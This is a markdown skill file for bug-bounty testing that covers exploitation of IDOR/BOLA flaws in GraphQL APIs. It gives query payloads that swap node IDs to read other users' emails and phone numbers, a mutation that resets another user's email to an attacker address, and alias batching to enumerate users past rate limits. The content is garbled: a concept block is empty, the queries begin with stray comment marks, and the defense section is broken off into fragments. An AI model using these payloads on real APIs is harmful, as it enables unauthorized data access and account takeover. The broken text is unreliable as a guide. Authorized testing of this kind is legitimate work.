---
name: graphql-idor
description: >
  Identify and exploit Insecure Direct Object Reference (IDOR) or Broken Object Level Authorization 
  (BOLA) vulnerabilities specifically within GraphQL APIs. This skill focuses on manipulating node 
  IDs, changing variables, and utilizing aliases to access unauthorized data.
domain: cybersecurity
subdomain: bug-hunting
category: APIs
difficulty: intermediate
estimated_time: "2-3 hours"
mitre_attack:
  tactics: [TA0001, TA0006]
  techniques: [T1190]
platforms: [web, graphql]
tags: [graphql, idor, bola, api-security, bug-hunting, authorization]
tools: [burp-suite, inql, graphql-voyager]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# GraphQL IDOR (BOLA) Exploitation

## When to Use
- When auditing modern web applications that utilize GraphQL as their API layer.
- To test the authorization controls on individual objects (nodes) within the graph, ensuring a user cannot access or modify nodes belonging to other users.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Identifying the Schema & IDs

```text
# Concept: ```

### Phase 2: Intercepting & Modifying Queries

```graphql
# query getUser {
  user(id: "VXNlcjoxNTA=") {
    id
    email
    personalPhone
  }
}
```

```graphql
# query getUser {
  user(id: "VXNlcjoxNTE=") {
    id
    email
    personalPhone
  }
}
```

### Phase 3: Exploiting Mutations (State Changes)

```graphql
# mutation {
  updateUserProfile(input: {
    userId: "VXNlcjoxNTE=",
    email: "hacker@evil.com"
  }) {
    success
  }
}
```

### Phase 4: Batching & Aliases (Bypassing Rate Limits / Automation)

```graphql
# query {
  user1: user(id: "1") { email }
  user2: user(id: "2") { email }
  user3: user(id: "3") { email }
}
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Identify Node ] --> B{Node ID modified ]}
    B -->|Yes| C[Check Response ]
    B -->|No| D[Check Context ]
    C --> E[Verify Data ]
```


## 🔵 Blue Team Detection & Defense
- **Object-Level Authorization**: **Context-Aware Resolvers**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Graphql Idor — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- OWASP: [API1:2019 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2019/en/0x11-t1/)
- PortSwigger: [GraphQL API Vulnerabilities](https://portswigger.net/web-security/graphql)
